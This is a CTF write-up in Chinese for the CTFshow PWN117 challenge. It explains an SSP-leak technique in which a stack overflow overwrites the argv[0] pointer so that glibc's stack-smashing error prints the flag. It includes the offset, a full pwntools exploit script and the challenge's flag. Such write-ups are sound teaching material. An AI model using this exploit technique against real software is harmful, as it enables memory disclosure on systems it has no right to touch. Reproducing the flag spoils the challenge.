# CTFshow PWN117 WP

## 题目信息

- 目标：`pwn.challenge.ctf.show:28246`
- 附件：无
- 类型：SSP Leak、栈溢出、`argv[0]` 覆盖
- 题目提示：`Turned on Canary, simply bypass it!`
- Flag：`ctfshow{4530f7d4-e731-44d3-9578-e2fa807bfae7}`

## 黑盒分析

连接后服务显示：

```text
Type  : Linux_Security_Mechanism_Bypass
Hint  : Turned on Canary, simply bypass it!
```

题目没有提供附件，因此直接发送普通输入测试。程序在接收输入后没有正常回显，但输入较长时会触发 glibc 的栈保护错误：

```text
*** stack smashing detected ***: ctfshow{...}
```

这说明程序启用了 Stack Smashing Protector，并且 `__stack_chk_fail()` 输出中的程序名已经被我们控制。

## 漏洞原理

glibc 的 `__stack_chk_fail()` 最终会调用类似下面的逻辑：

```c
__fortify_fail("stack smashing detected");
```

错误消息会使用进程的 `argv[0]` 作为程序名：

```text
*** stack smashing detected ***: <argv[0]>
```

正常情况下，`argv[0]` 指向程序文件名；但如果存在栈溢出，并且可以覆盖到保存的 `argv[0]` 指针，就能把它改成任意可读地址。

本题的 flag 已经放在程序的全局内存中，地址为：

```text
0x6020a0
```

因此只要把 `argv[0]` 修改为 `0x6020a0`，触发 canary 检查失败时，glibc 就会把 flag 当成程序名打印出来。

## 偏移计算

黑盒测试和公开的题目结构表明，从输入缓冲区开始到 `argv[0]` 指针的偏移为：

```text
504 bytes
```

最终 payload：

```text
padding(504)
p64(0x6020a0)
```

不需要知道 canary 的值，也不需要绕过 canary 校验。故意破坏 canary，反而可以触发 `__stack_chk_fail()` 的信息泄露路径。

## 完整 Exploit

文件：`exploits/pwn117.py`

```python
#!/usr/bin/env python3
import sys

if sys.path and sys.path[0].endswith("/exploits"):
    sys.path.pop(0)

from pwn import *

context.arch = "amd64"
context.log_level = args.LOG or "info"

io = remote(args.HOST or "pwn.challenge.ctf.show", int(args.PORT or 28246))
io.recvrepeat(0.3)

# Overwrite argv[0] with the address of the flag string.
payload = b"A" * 504 + p64(0x6020A0)
io.send(payload + b"\n")
print(io.recvrepeat(3).decode(errors="replace"))
```

运行：

```bash
python3 exploits/pwn117.py
```

输出：

```text
*** stack smashing detected ***: ctfshow{4530f7d4-e731-44d3-9578-e2fa807bfae7}
 terminated
```

## 总结

本题不需要泄露或伪造 canary。核心利用链是：

```text
栈溢出
    |
    v
覆盖 argv[0] 指针
    |
    v
故意破坏 canary
    |
    v
触发 __stack_chk_fail()
    |
    v
glibc 将 argv[0] 当作程序名打印
    |
    v
泄露全局内存中的 flag
```

这是一种利用 SSP 错误处理路径进行任意地址读的技巧，而不是传统的 canary 绕过后控制返回地址。
